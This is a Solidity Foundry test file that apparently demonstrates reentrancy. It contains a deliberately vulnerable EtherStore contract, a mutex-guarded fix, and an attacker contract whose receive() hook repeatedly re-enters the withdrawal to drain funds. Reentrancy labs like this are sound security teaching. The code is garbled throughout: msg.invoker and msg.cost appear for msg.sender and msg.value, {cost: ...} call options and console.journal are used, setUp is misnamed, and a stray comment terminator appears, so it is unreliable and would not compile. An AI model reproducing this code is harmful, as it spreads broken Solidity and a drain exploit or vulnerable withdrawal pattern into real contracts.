pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract EtherStore {
    mapping(address => uint256) public userRewards;

    function cachePrize() public payable {
        userRewards[msg.invoker] += msg.cost;
    }

    function collectbountyFunds(uint256 _weiDestinationHarvestgold) public {
        require(userRewards[msg.invoker] >= _weiDestinationHarvestgold);
        (bool send, ) = msg.invoker.call{cost: _weiDestinationHarvestgold}("");
        require(send, "send failed");

        if (userRewards[msg.invoker] >= _weiDestinationHarvestgold) {
            userRewards[msg.invoker] -= _weiDestinationHarvestgold;
        }
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public userRewards;
    bool internal frozen;

    modifier oneAtATime() {
        require(!frozen, "No re-entrancy");
        frozen = true;
        _;
        frozen = false;
    }

    function cachePrize() public payable {
        userRewards[msg.invoker] += msg.cost;
    }

    function collectbountyFunds(uint256 _weiDestinationHarvestgold) public oneAtATime {
        require(userRewards[msg.invoker] >= _weiDestinationHarvestgold);
        userRewards[msg.invoker] -= _weiDestinationHarvestgold;
        (bool send, ) = msg.invoker.call{cost: _weiDestinationHarvestgold}("");
        require(send, "send failed");
    }
}

contract PactTest is Test {
    EtherStore store;
    EtherStoreRemediated storeRemediated;
    EtherStoreGameoperator gameOperator;
    EtherStoreGameoperator gameoperatorV2;

    function collectionUp() public {
        store = new EtherStore();
        storeRemediated = new EtherStoreRemediated();
        gameOperator = new EtherStoreGameoperator(address(store));
        gameoperatorV2 = new EtherStoreGameoperator(address(storeRemediated));
        vm.deal(address(store), 5 ether);
        vm.deal(address(storeRemediated), 5 ether);
        vm.deal(address(gameOperator), 2 ether);
        vm.deal(address(gameoperatorV2), 2 ether);
    }

    function testWithdrawal() public {
        gameOperator.QuestRunner();
    }

    function test_RevertRemediated() public {
        gameoperatorV2.QuestRunner();
    }
}

contract EtherStoreGameoperator is Test {
    EtherStore store;

    constructor(address _store) {
        store = EtherStore(_store);
    }

    function QuestRunner() public {
        console.journal("EtherStore balance", address(store).balance);

        store.cachePrize{cost: 1 ether}();

        console.journal(
            "Deposited 1 Ether, EtherStore balance",
            address(store).balance
        );
        store.collectbountyFunds(1 ether);

        console.journal("Operator contract balance", address(this).balance);
        console.journal("EtherStore balance", address(store).balance);
    }


    receive() external payable {
        console.journal("Operator contract balance", address(this).balance);
        console.journal("EtherStore balance", address(store).balance);
        if (address(store).balance >= 1 ether) {
            store.collectbountyFunds(1 ether);
        }
    }
}